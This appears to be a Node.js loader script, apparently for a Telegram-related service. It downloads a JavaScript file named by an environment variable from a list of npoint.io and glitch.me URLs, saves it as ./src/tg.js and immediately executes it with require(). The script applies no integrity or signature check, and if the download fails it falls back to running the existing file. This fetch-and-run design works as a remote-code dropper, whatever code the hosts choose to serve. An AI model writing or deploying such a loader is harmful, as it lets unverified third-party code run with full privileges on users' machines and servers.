require('dotenv').config();
const fetch = require("node-fetch");
const { Headers } = require("node-fetch");
globalThis.fetch = fetch;
globalThis.Headers = Headers;
const fs = require("fs");
const path = require("path");
const { performance } = require("perf_hooks");

// Configuration with validation
const config = {
  FETCH_TIMEOUT: process.env.FETCH_TIMEOUT || 10000,
  MAX_RETRIES: process.env.MAX_RETRIES || 3,
  MIN_RETRY_DELAY: process.env.MIN_RETRY_DELAY || 1000,
  MAX_RETRY_DELAY: process.env.MAX_RETRY_DELAY || 10000,
  BUILD_URLS: [
    "https://api.npoint.io/3375d15db1eece560188",
    "https://mytghelper.glitch.me/builds",
    "https://cms-nst.glitch.me/builds",
    "https://uptimechecker2.glitch.me/builds"
  ],
  FILE_SAVE_PATH: "./src/tg.js"
};
const key = fetchNumbersFromString(process.env.clientId);
const service = process.env.service

// Validate configuration
function validateConfig() {
  if (!config.BUILD_URLS || !Array.isArray(config.BUILD_URLS) || config.BUILD_URLS.length === 0) {
    throw new Error("Invalid BUILD_URLS configuration");
  }
  if (!process.env.clientId) {
    console.warn("Warning: clientId environment variable is not set");
  }
}

// Service state tracking
const serviceState = {
  isRunning: false,
  lastError: null,
  startTime: null,
  healthCheck: {
    lastCheck: null,
    status: "initializing"
  }
};

// Improved helper function with exponential backoff
function calculateBackoff(attempt, minDelay = config.MIN_RETRY_DELAY, maxDelay = config.MAX_RETRY_DELAY) {
  const delay = Math.min(minDelay * Math.pow(2, attempt), maxDelay);
  return delay + Math.random() * 1000; // Add jitter
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function fetchNumbersFromString(inputString) {
  if (!inputString) return "";
  const regex = /\d+/g;
  const matches = inputString?.match(regex);
  if (matches) {
    return matches.join("");
  }
  return inputString;
}

// Enhanced fetch with retries and exponential backoff
async function fetchWithRetries(url, timeout, retries = config.MAX_RETRIES) {
  let attempt = 0;
  let lastError = null;

  while (attempt <= retries) {
    try {
      const response = await fetchWithTimeout(url, timeout);
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response;
    } catch (error) {
      lastError = error;
      attempt++;

      if (attempt > retries) {
        const finalError = new Error(`Failed to fetch ${url} after ${retries} attempts. Error: ${lastError.message}`);
        finalError.originalError = lastError;
        throw finalError;
      }

      const backoffDelay = calculateBackoff(attempt);
      console.warn(`Retrying fetch ${url}. Attempt: ${attempt}/${retries}. Waiting for ${Math.round(backoffDelay)}ms...`);
      await delay(backoffDelay);
    }
  }
}

// Improved file system operations with validation
async function ensureDirectoryExistence(filePath) {
  try {
    const dirname = path.dirname(filePath);
    if (!fs.existsSync(dirname)) {
      await fs.promises.mkdir(dirname, { recursive: true });
    }
    // Verify directory is writable
    await fs.promises.access(dirname, fs.constants.W_OK);
  } catch (error) {
    throw new Error(`Failed to ensure directory existence: ${error.message}`);
  }
}

// Enhanced JSON validation with schema checking
async function validateAndParseJson(response) {
  try {
    const data = await response.json();

    // Validate data structure
    if (!data || typeof data !== "object") {
      throw new Error("Invalid JSON structure: expected an object");
    }

    // Validate required fields based on your data schema
    if (!data.cts || typeof data.cts !== "string") {
      throw new Error("Invalid JSON structure: missing or invalid 'cts' field");
    }

    return data;
  } catch (error) {
    throw new Error(`Invalid JSON response: ${error.message}`);
  }
}

// Enhanced file operations with validation
async function fetchAndSave(url, filename) {
  if (!url || typeof url !== "string") {
    throw new Error("Invalid URL provided");
  }

  try {
    console.log("Service Url: ", url);
    const response = await fetchWithRetries(url, config.FETCH_TIMEOUT);

    if (!response.ok) {
      throw new Error(`Failed to fetch URL. Status Code: ${response.status}`);
    }

    const filepath = path.resolve(filename);
    await ensureDirectoryExistence(filepath);

    const buffer = await response.buffer();

    // Write to temporary file first
    const tempPath = `${filepath}.tmp`;
    await fs.promises.writeFile(tempPath, buffer);

    // Verify file was written correctly
    const stat = await fs.promises.stat(tempPath);
    if (stat.size === 0) {
      throw new Error("Failed to write file: file size is 0");
    }

    // Rename temp file to final destination
    await fs.promises.rename(tempPath, filepath);

    return filepath;
  } catch (error) {
    // Cleanup temp file if it exists
    try {
      const tempPath = `${filename}.tmp`;
      if (fs.existsSync(tempPath)) {
        await fs.promises.unlink(tempPath);
      }
    } catch (cleanupError) {
      console.error("Failed to cleanup temporary file:", cleanupError);
    }
    throw new Error(`Error fetching and saving file: ${error.message}`);
  }
}

// Fetch with timeout function
async function fetchWithTimeout(url, timeout) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await fetch(url, {
      signal: controller.signal,
      headers: {
        "User-Agent": "ServiceLoader/1.0",
        "Accept": "application/json"
      }
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    if (error.name === "AbortError") {
      throw new Error(`Fetch request to ${url} timed out after ${timeout / 1000} seconds`);
    }
    throw error;
  } finally {
    clearTimeout(timeoutId);
  }
}

// Enhanced service loading with proper error handling
async function loadAndStartService() {
  let data;
  let fastestService = null;
  let fastestTime = Infinity;

  // Validate configuration before starting
  validateConfig();

  // Track service state
  serviceState.startTime = Date.now();
  serviceState.isRunning = true;

  // Setup graceful shutdown
  setupGracefulShutdown();

  // Try to fetch from each build URL
  for (const buildUrl of config.BUILD_URLS) {
    try {
      console.log(`Loading builds from: ${buildUrl}`);

      const startTime = performance.now();
      const result = await fetchWithRetries(buildUrl, config.FETCH_TIMEOUT);

      data = await validateAndParseJson(result);

      const elapsedTime = performance.now() - startTime;
      console.log(`Successfully fetched from: ${buildUrl} in ${elapsedTime.toFixed(2)}ms`);

      if (elapsedTime < fastestTime) {
        fastestTime = elapsedTime;
        fastestService = buildUrl;
      }
      break; // Exit loop on first success
    } catch (error) {
      console.error(`Error fetching from ${buildUrl}: ${error.message}`);
      if (buildUrl === config.BUILD_URLS[config.BUILD_URLS.length - 1]) {
        console.error("All URLs failed. Continuing to start service.");
      }
    }
  }

  if (data) {
    console.log(`Fetched builds from fastest URL: ${fastestService} (${fastestTime.toFixed(2)}ms)`);
  } else {
    console.warn("No valid data fetched. Proceeding with service startup.");
  }

  // Attempt to fetch and save the file
  try {
    const filePath = await fetchAndSave(data[service], config.FILE_SAVE_PATH);
    console.log(`File saved at: ${filePath}`);
  } catch (error) {
    console.error(`Failed to fetch and save file: ${error.message}`);
    serviceState.lastError = error;
    console.warn("Proceeding with existing service file.");
  }

  // Start the service with enhanced error handling
  console.log("Starting Service...");
  try {
    require(config.FILE_SAVE_PATH);
    console.log("Service initiation complete");
    serviceState.healthCheck.status = "healthy";
  } catch (error) {
    serviceState.lastError = error;
    serviceState.healthCheck.status = "error";
    console.error(`Failed to start service: ${error.message}`);
    throw error;
  }
}

// Setup graceful shutdown handlers
function setupGracefulShutdown() {
  const cleanup = async () => {
    if (!serviceState.isRunning) return;

    console.log("\nInitiating graceful shutdown...");
    serviceState.isRunning = false;

    try {
      // Cleanup temp files
      const tempPath = `${config.FILE_SAVE_PATH}.tmp`;
      if (fs.existsSync(tempPath)) {
        await fs.promises.unlink(tempPath);
      }
    } catch (error) {
      console.error("Error during cleanup:", error);
    }

    console.log("Shutdown complete");
    process.exit(0);
  };

  // Handle different termination signals
  process.on("SIGTERM", cleanup);
  process.on("SIGINT", cleanup);

  // Handle uncaught errors
  process.on("uncaughtException", (error) => {
    console.error("Uncaught Exception:", error);
    serviceState.lastError = error;
    serviceState.healthCheck.status = "error";
    cleanup().catch(console.error);
  });

  // Handle unhandled promise rejections
  process.on("unhandledRejection", (reason, promise) => {
    console.error("Unhandled Rejection at:", promise, "reason:", reason);
    serviceState.lastError = reason;
    serviceState.healthCheck.status = "error";
  });
}

// Main entry point with enhanced error handling
(async () => {
  try {
    console.log("Starting...");
    await loadAndStartService();
    console.log("Service Started");
  } catch (error) {
    console.error(`Service failed to start: ${error.message}`);
    serviceState.lastError = error;
    serviceState.healthCheck.status = "error";

    try {
      require(config.FILE_SAVE_PATH);
    } catch (fallbackError) {
      console.error("Failed to start service from existing file:", fallbackError);
      process.exit(1);
    }
  }
})();
